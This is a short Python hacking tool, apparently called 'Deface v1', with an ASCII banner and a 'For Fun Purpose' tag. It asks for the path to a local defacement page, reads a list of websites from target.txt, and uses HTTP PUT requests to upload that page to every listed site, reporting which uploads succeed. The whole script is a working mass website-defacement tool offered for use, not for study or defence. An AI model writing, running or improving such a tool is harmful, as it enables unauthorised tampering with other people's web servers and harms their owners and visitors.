#####################
#coded by retnox

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("install requests and try again ...")

banner = """
░█▀▀▄ ░█▀▀▀ ░█▀▀▀ ─█▀▀█ ░█▀▀█ ░█▀▀▀ 
░█─░█ ░█▀▀▀ ░█▀▀▀ ░█▄▄█ ░█─── ░█▀▀▀ 
░█▄▄▀ ░█▄▄▄ ░█─── ░█─░█ ░█▄▄█ ░█▄▄▄ 

░█──░█ ▄█─ 
─░█░█─ ─█─ 
──▀▄▀─ ▄█▄
                       
#author:Faris

For Fun Purpose
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)
    return str(ipt)

def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        targets = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % len(targets))
        for web in targets:
            try:
                site = web.strip()
                if not site.startswith("http://"):
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))
            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print()
                exit()

def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("Enter your deface page path: ")
            if not os.path.isfile(a):
                print("file '%s' not found" % a)
                continue
            else:
                break
        except KeyboardInterrupt:
            print()
            exit()

    aox(a)


if __name__ == "__main__":
    main(banner)
